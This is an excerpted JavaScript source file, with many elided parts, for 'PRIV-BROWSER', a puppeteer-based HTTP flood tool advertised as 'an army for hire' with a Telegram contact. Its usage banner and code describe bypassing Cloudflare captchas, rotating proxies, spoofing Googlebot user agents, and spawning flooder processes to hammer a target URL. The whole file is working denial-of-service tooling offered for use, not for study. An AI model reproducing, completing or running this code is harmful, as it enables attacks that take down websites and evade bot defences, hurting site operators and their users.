/*
    ...
    npm puppeteer browsers install chrome@stable
*/
...
if (process.argv.length < 7) {
    console.clear();
    console.log(`\n                      PRIV-BROWSER | an army for hire

                                 3 Oktober, 2025 

                                    t.me/tcpflood53`);
    console.log(`
    🚀 BROWSER v1.1  |  Cloudflare Captcha bypass, new browser rendering modes,
...
———————————————————————————————————————————————————
    ...
    ❓ USAGE:
        ...
        xvfb-run node BROWSER.js [target] [time] [forks] [rate] [proxy] (opsions)
        xvfb-run node BROWSER.js https://timmy.com 90 6 30 http.txt --fp false

    ⚙️  OPTIONS:

        --debug    true/false    ~    Enable script debugging.     [default: true]
        --head     true/false    ~    Browser headless mode.       [default: false]
        --auth     true/false    ~    Proxy authentication.        [default: false]
        --rate     true/false    ~    Random request rate.         [default: false]
        --fp       true/false    ~    Browser fingerprint.         [default: false]
        
        --threads      10        ~    Number of flooder forks.     [default: 1]
        --cookies      10        ~    Amount of spare cookies.     [default: 0]

    ——> FLOODER: [ reset, ratelimit, randrate,randpath, close, delay, streams ]
    `);
    process.exit(0)
};
...
const proxyfile = process.argv[6] || 'http.txt';
...
function log(type, string) {
    ...
    if (enabled('debug')) {
        console.log(`(${hours}:${minutes}:${seconds}) [${script}] | ${string}`);
    }
}
...
async function flooder(headers, proxy, ua, cookie) {
    ...
    log(2, `(${proxy}) Spawning Flooder`);

    const flooder_process = spawn("node", args, {
        stdio: 'pipe'
    });
    ...
    flooder_process.stderr.on('data', (data) => {
        log(2, `(${proxy}) Error: ${data.toString('utf8')}`);
        flooder_process.kill();
    })

    flooder_process.on('error', (err) => {
        log(2, `(${proxy}) Error: ${err.message}`);
        flooder_process.kill();
    })

    flooder_process.on('close', (code) => {
        log(2, `(${proxy}) Close: ${code}`);
        flooder_process.kill();
    })
}
...
async function main(reserve) {
  ...
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
            ...
            log(1, `(${proxy}) User-Agent: ${userAgent}`);
            ...
            async function title() {
                ...
                const title_interval = setInterval(async () => {
                    try {
                        ...
                        err_count += 1;
                        if (err_count >= 5) {
                            log(1, `(${proxy}) Error Too many errors!`);
                            await page.close();
                            await browser.close();
                            return main();
                        }
